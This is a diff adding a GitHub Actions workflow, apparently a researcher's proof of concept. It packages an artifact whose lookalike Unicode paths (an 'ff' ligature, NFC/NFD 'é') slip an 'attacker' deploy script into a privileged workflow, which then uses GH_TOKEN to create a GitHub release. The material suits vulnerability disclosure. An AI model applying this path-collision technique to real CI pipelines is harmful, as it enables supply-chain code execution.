@@ -1,0 +1,117 @@
+name: Artifact Internal Path Source Impact
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prepare single artifact with Unicode-equivalent internal paths
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf payload
+          python3 - <<'PY'
+          from pathlib import Path
+          from textwrap import dedent
+
+          root = Path("payload")
+
+          trusted_deploy = dedent("""\
+          #!/usr/bin/env bash
+          set -euo pipefail
+          mkdir -p observations
+          {
+            echo "source=trusted-internal-deploy-script"
+            echo "method=single-artifact-internal-path"
+            echo "download-mode=${DOWNLOAD_MODE:-unknown}"
+            echo "source-run-id=${SOURCE_RUN_ID:-unknown}"
+          } > "observations/trusted-internal-${DOWNLOAD_MODE:-unknown}.txt"
+          """)
+
+          attacker_deploy = dedent("""\
+          #!/usr/bin/env bash
+          set -euo pipefail
+          mkdir -p publish observations
+
+          PROOF="publish/internal-path-${DOWNLOAD_MODE}-codeexec-proof.txt"
+          TAG="artifact-internal-path-${DOWNLOAD_MODE}-${SOURCE_RUN_ID}"
+
+          cat > "$PROOF" <<EOF
+          source=attacker-internal-path-deploy-script
+          method=single-artifact-unicode-internal-path-collision
+          download-mode=${DOWNLOAD_MODE}
+          source-run-id=${SOURCE_RUN_ID}
+          source-run-url=${SOURCE_RUN_URL}
+          privileged-run-id=${PRIVILEGED_RUN_ID}
+          repository=${GITHUB_REPOSITORY}
+          trusted-exec-rel=${TRUSTED_EXEC_REL}
+          attacker-exec-rel=${ATTACKER_EXEC_REL}
+          trusted-chunk-rel=${TRUSTED_CHUNK_REL}
+          attacker-chunk-rel=${ATTACKER_CHUNK_REL}
+          gh-token-present=${GH_TOKEN:+true}
+          EOF
+
+          gh release delete "$TAG" --repo "$GITHUB_REPOSITORY" --yes --cleanup-tag >/dev/null 2>&1 || true
+          {
+            echo "Single artifact internal path Unicode collision impact"
+            echo
+            echo "Source run: ${SOURCE_RUN_URL}"
+            echo "Download mode: ${DOWNLOAD_MODE}"
+            echo "The attached proof was produced by executing the trusted internal path after artifact extraction."
+          } > "observations/internal-path-${DOWNLOAD_MODE}-release-notes.md"
+
+          gh release create "$TAG" "$PROOF" \
+            --repo "$GITHUB_REPOSITORY" \
+            --target "$GITHUB_SHA" \
+            --title "Internal path collision ${DOWNLOAD_MODE} ${SOURCE_RUN_ID}" \
+            --notes-file "observations/internal-path-${DOWNLOAD_MODE}-release-notes.md"
+
+          gh release view "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            --json url,tagName \
+            --jq '{tagName: .tagName, url: .url}' > "observations/internal-path-${DOWNLOAD_MODE}-release.json"
+          """)
+
+          files = {
+              # ASCII trusted path versus U+FB00 ligature attacker path. The trusted ASCII
+              # path is the one the privileged workflow executes.
+              "bin/deploy-ff.sh": trusted_deploy,
+              "bin/deploy-\ufb00.sh": attacker_deploy,
+              # Chunk-composition NFC/NFD pair: the privileged workflow reads the
+              # chunk-built NFD path and observes attacker-controlled NFC content.
+              "dist/release-e\u0301.txt": "source=trusted-nfd-chunk-path\n",
+              "dist/release-\u00e9.txt": "source=attacker-nfc-whole-path\n",
+              "README.txt": "single artifact internal Unicode path collision payload\n",
+          }
+
+          for name, body in files.items():
+              path = root / name
+              path.parent.mkdir(parents=True, exist_ok=True)
+              path.write_text(body, encoding="utf-8")
+
+          for path in sorted(p for p in root.rglob("*") if p.is_file()):
+              rel = str(path.relative_to(root))
+              print(repr(rel), path.read_bytes().hex()[:160])
+          PY
+
+      - name: Upload single artifact
+        id: upload
+        uses: actions/upload-artifact@v7
+        with:
+          name: artifact-internal-path-impact-${{ github.run_id }}
+          path: payload
+          include-hidden-files: true
+
+      - name: Print artifact metadata
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "artifact-name=artifact-internal-path-impact-${GITHUB_RUN_ID}"
+          echo "artifact-id=${{ steps.upload.outputs.artifact-id }}"
+          echo "artifact-url=${{ steps.upload.outputs.artifact-url }}"
+          echo "artifact-digest=${{ steps.upload.outputs.artifact-digest }}"
